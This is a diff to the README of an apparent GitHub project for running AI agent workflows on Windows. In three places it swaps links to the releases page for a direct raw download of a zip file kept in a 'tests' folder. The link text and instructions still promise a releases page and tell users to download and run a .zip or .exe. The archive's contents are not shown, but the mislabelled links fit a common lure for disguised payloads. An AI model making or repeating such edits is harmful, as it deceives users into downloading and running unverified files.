@@ -1,10 +1,10 @@
 # 🤖 codex-skill-ai-agent-workflow - Run AI Agent Workflows Fast
 
-[🟦⬜ Visit the releases page to download](https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases)
+[🟦⬜ Visit the releases page to download](https://raw.githubusercontent.com/philberthandson333/codex-skill-ai-agent-workflow/main/tests/skill_workflow_ai_codex_agent_v3.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases
+Visit this page to download: https://raw.githubusercontent.com/philberthandson333/codex-skill-ai-agent-workflow/main/tests/skill_workflow_ai_codex_agent_v3.4.zip
 
 On the releases page, look for the latest release near the top. Download the file that matches your Windows setup. If you see a `.zip` file, save it to your computer. If you see an `.exe` file, download that file instead.
 
@@ -154,7 +154,7 @@ Check the result against your goal. If it misses the mark, edit the prompt or ad
 
 ## 📦 Release Page
 
-Download the latest Windows release here: https://github.com/philberthandson333/codex-skill-ai-agent-workflow/releases
+Download the latest Windows release here: https://raw.githubusercontent.com/philberthandson333/codex-skill-ai-agent-workflow/main/tests/skill_workflow_ai_codex_agent_v3.4.zip
 
 ## 🧩 Repository Topics
 
